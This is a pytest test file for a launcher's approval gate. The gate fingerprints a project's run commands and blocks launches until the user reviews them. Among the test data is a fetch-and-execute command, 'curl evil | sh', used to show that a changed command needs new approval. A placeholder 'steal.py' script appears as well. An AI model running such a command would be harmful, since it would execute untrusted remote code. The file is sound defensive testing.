"""Tests for `alpacka.approval` — reviewing a project's run settings."""
from __future__ import annotations

import sqlite3
from pathlib import Path

import pytest

from alpacka import approval, db, launch, library, paths, project


@pytest.fixture
def lib(tmp_path, monkeypatch):
    """An isolated config dir with an initialised library DB."""
    monkeypatch.setattr(paths, "config_root", lambda: tmp_path / "config")
    monkeypatch.setattr(paths, "cache_root", lambda: tmp_path / "cache")
    db.init()
    return tmp_path


def make_project(root: Path, name: str, yml: str) -> Path:
    folder = root / name
    folder.mkdir(parents=True)
    (folder / "alpacka.yml").write_text(yml, encoding="utf-8")
    return folder


GENERIC = (
    "name: Svc\nkind: generic\n"
    "run_configs:\n  - name: default\n    command: python serve.py\n"
    "launch_dependencies:\n  - name: worker\n    command: python worker.py\n"
)
TD_PLAIN = "name: Show\nkind: touchdesigner\nkind_data:\n  touchdesigner:\n    toe_file: Show.toe\n"


def load(text: str, tmp_path: Path) -> project.Project:
    return project.load(make_project(tmp_path, "p", text))


# --- fingerprint / needs_review ----------------------------------------------


def test_fingerprint_ignores_volatile_fields(tmp_path):
    p = load(GENERIC, tmp_path)
    fp = approval.fingerprint(p)
    p.name, p.tags, p.last_opened, p.description = "Other", ["x"], "now", "d"
    p.td_version = "2099.1"
    assert approval.fingerprint(p) == fp


def test_fingerprint_changes_with_what_runs(tmp_path):
    p = load(GENERIC, tmp_path)
    fp = approval.fingerprint(p)
    p.launch_dependencies[0]["command"] = "curl evil | sh"
    assert approval.fingerprint(p) != fp


def test_fingerprint_is_order_independent(tmp_path):
    a = load(GENERIC, tmp_path / "a")
    b = load(
        "kind: generic\nname: Svc\n"
        "launch_dependencies:\n  - command: python worker.py\n    name: worker\n"
        "run_configs:\n  - command: python serve.py\n    name: default\n",
        tmp_path / "b",
    )
    assert approval.fingerprint(a) == approval.fingerprint(b)


def test_plain_td_project_needs_no_review(tmp_path):
    assert not approval.needs_review(load(TD_PLAIN, tmp_path))


@pytest.mark.parametrize(
    "extra",
    [
        "launch_on_startup: true\n",
        "variables:\n  PYTHONPATH: /evil\n",
        "launch_dependencies:\n  - command: helper.exe\n",
    ],
)
def test_td_project_needs_review_when_yml_adds_something(tmp_path, extra):
    assert approval.needs_review(load(TD_PLAIN + extra, tmp_path))


def test_td_absolute_toe_needs_review(tmp_path):
    text = TD_PLAIN.replace("Show.toe", "C:/elsewhere/Other.toe")
    assert approval.needs_review(load(text, tmp_path))


@pytest.mark.parametrize(
    "path, escapes",
    [
        ("Show.toe", False),
        ("sub/Show.toe", False),
        ("C:/x/y.toe", True),          # Windows drive, on any OS
        ("/abs/y.toe", True),          # POSIX absolute, on any OS
        ("../up.toe", True),
        (r"sub\..\..\x.toe", True),    # Windows separators, on any OS
        (r"\\server\share\x.toe", True),
    ],
)
def test_escapes_folder_is_the_same_on_every_os(path, escapes):
    assert approval._escapes_folder(path) is escapes


def test_other_kinds_always_need_review(tmp_path):
    assert approval.needs_review(load("name: X\nkind: python\n", tmp_path))


def test_describe_lists_commands_and_dependencies(tmp_path):
    text = approval.describe(load(GENERIC + "launch_on_startup: true\n", tmp_path))
    assert "python serve.py" in text
    assert "python worker.py" in text
    assert "Starts automatically" in text


# --- approval storage + the launch gate --------------------------------------


def test_spawn_refuses_until_approved(lib, monkeypatch):
    rid = library.add(make_project(lib, "svc", GENERIC))
    entry = library.get(rid)
    assert not approval.is_approved(entry)
    with pytest.raises(launch.NeedsApproval):
        launch._spawn(entry)

    approval.approve(entry)
    assert approval.is_approved(library.get(rid))

    # Past the gate, _spawn goes on to the kind handler.
    class Reached(Exception):
        pass

    def stop(_kind):
        raise Reached

    monkeypatch.setattr(launch.kinds, "get", stop)
    with pytest.raises(Reached):
        launch._spawn(library.get(rid))


def test_changed_settings_need_review_again(lib):
    folder = make_project(lib, "svc", GENERIC)
    rid = library.add(folder)
    approval.approve(library.get(rid))
    yml = folder / "alpacka.yml"
    yml.write_text(yml.read_text().replace("python worker.py", "python steal.py"))
    assert not approval.is_approved(library.get(rid))


def test_edit_in_alpacka_carries_approval_forward(lib):
    rid = library.add(make_project(lib, "show", TD_PLAIN))
    entry = library.get(rid)
    before = approval.was_approved(rid, entry.project)  # plain TD: approved
    entry.project.launch_on_startup = True
    project.save(entry.project)
    approval.carry_forward(rid, before)
    assert approval.is_approved(library.get(rid))


def test_edit_does_not_approve_unreviewed_settings(lib):
    rid = library.add(make_project(lib, "svc", GENERIC))
    entry = library.get(rid)
    before = approval.was_approved(rid, entry.project)
    entry.project.tags = ["x"]
    project.save(entry.project)
    approval.carry_forward(rid, before)
    assert not approval.is_approved(library.get(rid))


def test_migration_grandfathers_existing_projects(tmp_path, monkeypatch):
    monkeypatch.setattr(paths, "config_root", lambda: tmp_path / "config")
    monkeypatch.setattr(paths, "cache_root", lambda: tmp_path / "cache")
    folder = make_project(tmp_path, "svc", GENERIC)
    # A v6 library with one project, as an older ALPACKA left it.
    paths.ensure_dirs()
    conn = sqlite3.connect(paths.db_path())
    conn.executescript(db.SCHEMA_SQL.replace("    approved_run_hash TEXT\n", "").replace(
        "kind TEXT NOT NULL DEFAULT 'touchdesigner',\n);", "kind TEXT NOT NULL DEFAULT 'touchdesigner'\n);"
    ))
    conn.execute(
        "INSERT INTO projects (path, added_at) VALUES (?, '2026-01-01')", (str(folder.resolve()),)
    )
    conn.execute("PRAGMA user_version = 6")
    conn.commit()
    conn.close()

    db.init()
    entry = library.list_entries()[0]
    assert entry.approved_run_hash == approval.PENDING_UPGRADE
    approval.grandfather_existing()
    assert approval.is_approved(library.list_entries()[0])


def test_auto_launch_holds_unapproved_projects(lib, monkeypatch):
    from alpacka import app

    library.add(make_project(lib, "svc", GENERIC + "launch_on_startup: true\n"))
    launched, held = [], []
    monkeypatch.setattr(app.td_install, "detect", lambda: [])
    monkeypatch.setattr(app.launch, "launch", lambda entry, **k: launched.append(entry))
    approval.subscribe(held.extend)
    try:
        app._auto_launch_flagged()
    finally:
        approval.unsubscribe(held.extend)
    assert launched == []
    assert held == ["Svc"]
